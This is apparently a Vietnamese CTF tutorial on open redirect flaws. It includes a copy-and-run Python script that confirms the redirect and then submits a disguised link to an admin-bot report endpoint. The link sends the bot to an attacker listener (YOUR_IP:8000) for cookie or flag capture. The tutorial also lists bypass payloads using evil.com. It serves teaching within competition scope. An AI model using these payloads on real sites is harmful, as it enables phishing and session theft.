# Open Redirect (link trông như thật nhưng đưa bạn đi nơi khác)

Nhiều trang có chức năng "chuyển hướng" — ví dụ sau khi đăng nhập xong, quay lại đúng trang bạn đang xem trước đó, dùng tham số kiểu `?next=...` hoặc `?redirect=...` để ghi nhớ URL cần quay về. Nếu server không kiểm tra URL đích có thuộc chính domain của mình không, bạn đổi tham số đó thành 1 trang lừa đảo do bạn dựng, ví dụ `?next=https://evil.com`. Link vẫn bắt đầu bằng domain thật (trông đáng tin, qua được mắt người đọc hoặc bộ kiểm tra tự động chỉ nhìn phần đầu URL) nhưng cuối cùng lại đưa người bấm sang trang giả hoàn toàn khác.

Trên Burp bạn nhận ra lỗi này khi: URL có tham số `?url=`, `?next=`, `?redirect=`, `?return_to=`, `?continue=` (thường sau trang login/logout) — bạn đổi giá trị tham số đó thành 1 domain ngoài, Send, và thấy Response trả về status 3xx kèm header `Location` trỏ đúng ra domain ngoài bạn vừa đưa vào (không bị ép về `/` hay domain gốc).

## Snippet copy-là-chạy

```python
import requests


def solve_one(session, base_url):
    # Bước 1: xác nhận có Open Redirect -- đổi tham số next thành domain ngoài,
    # KHÔNG cho requests tự follow redirect (allow_redirects=False) để xem đúng
    # header Location gốc, giống cách Burp Repeater mặc định không tự follow.
    r = session.get(
        f"{base_url}/login",
        params={"next": "https://evil-test.com"},
        allow_redirects=False,
        timeout=5,
    )
    location = r.headers.get("Location", "")
    print("status:", r.status_code, "Location:", location)

    if "evil-test.com" not in location:
        return None  # không redirect ra ngoài được -- có thể app đã chặn đúng

    # Bước 2: Open Redirect tự nó hiếm khi cho điểm trực tiếp -- giá trị thật là
    # dùng nó để "ngụy trang" 1 link độc trông như link domain thật, gửi cho chức
    # năng "report URL cho admin bot" (chức năng này thường chỉ chấp nhận URL bắt
    # đầu đúng domain target.com). Ví dụ:
    my_listener = "http://YOUR_IP:8000/"   # đổi thành IP/máy bạn đang lắng nghe
    disguised_url = f"{base_url}/login?next={my_listener}"

    report = session.post(
        f"{base_url}/report",
        data={"url": disguised_url},
        timeout=5,
    )
    # Nếu chức năng report có bot tự mở link, bot sẽ bị chuyển hướng tới my_listener
    # -- phần nhận dữ liệu từ bot (đọc cookie bot gửi tới, lấy flag...) làm ở bài
    # XSS/CSRF tương ứng, Open Redirect ở đây chỉ là bước "mở khóa" để qua whitelist domain.
    return report.text


if __name__ == "__main__":
    s = requests.Session()
    s.verify = False
    print(solve_one(s, "http://target"))
```

## Giải thích cho người mới

- `allow_redirects=False`: mặc định `requests` tự động "đi theo" redirect luôn, bạn sẽ không nhìn thấy header `Location` gốc nữa (chỉ thấy trang cuối cùng). Tắt nó để thấy đúng điều Burp Repeater cho bạn thấy mặc định: status 3xx và header `Location`.
- Biến `location` kiểm tra xem domain bạn đưa vào (`evil-test.com`) có thật sự xuất hiện trong header `Location` không — nếu app validate đúng, giá trị trả về sẽ bị ép thành `/` (đường dẫn tương đối) chứ không còn domain ngoài.
- Phần "ngụy trang" (disguised_url) là lý do chính khiến Open Redirect có giá trị trong CTF: nhiều chức năng khác (report URL cho bot, SSRF, OAuth) có kiểm tra "URL phải bắt đầu bằng domain target.com" — Open Redirect giúp bạn tạo 1 URL VẪN bắt đầu đúng domain đó (qua được kiểm tra) nhưng tự chuyển hướng sang nơi khác ngay sau khi tải xong.
- Nếu `?next=https://evil.com` bị chặn (ép về domain gốc), thử các cách né kiểm tra sai của app: `//evil.com` (không có `http:`, trình duyệt tự hiểu là đổi domain cùng giao thức), `https://target.com.evil.com` (app chỉ check `startswith('https://target.com')` sẽ bị qua), hoặc `https://target.com@evil.com` (phần trước dấu `@` chỉ là username, trình duyệt bỏ qua, điều hướng thật tới sau `@`).

## Lưu ý nhanh

- Open Redirect gần như không tự cho điểm — luôn tự hỏi "redirect này giúp gì cho mục tiêu lớn hơn" (lừa bot report, vượt whitelist domain của 1 lỗi khác) trước khi dành nhiều thời gian cho nó.
- Luôn test riêng Open Redirect trước (xác nhận đúng header `Location`) rồi mới ghép vào URL dùng cho bài khác, để biết chính xác lỗi nằm ở bước nào nếu không ăn.
- Nếu app chỉ chấp nhận path tương đối bắt đầu bằng `/` và chặn đúng cả `//` (protocol-relative), không khai thác được Open Redirect ở endpoint đó.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
